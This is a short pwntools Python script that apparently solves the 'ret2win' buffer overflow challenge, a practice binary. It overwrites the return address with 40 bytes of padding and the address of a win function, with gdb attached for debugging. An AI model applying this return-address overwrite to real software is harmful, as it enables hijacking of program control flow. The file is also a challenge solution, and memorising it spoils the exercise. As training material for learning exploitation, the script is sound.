# import pwntools
from pwn import *

# setup split context
context.terminal = ['tmux', 'splitw', '-h']

# initiate the process
io = process('./ret2win')

# attach gdb, and break at 'main'
gdb.attach(io, '''
break main
''')

# cyclic for finding offset
cyclic = cyclic(100)

# develop exploit, ret2win is at 0x400756, but we bypass the prologue at 0x40075a
# it seems we need to preserve the stack for some reason here, and so we advance a bit
pad = b'a'*40
target = p64(0x40075a)
exploit = pad + target

# exploit some stuff
io.sendafter(b'> ', exploit)

# ensure we hold the window open
io.interactive()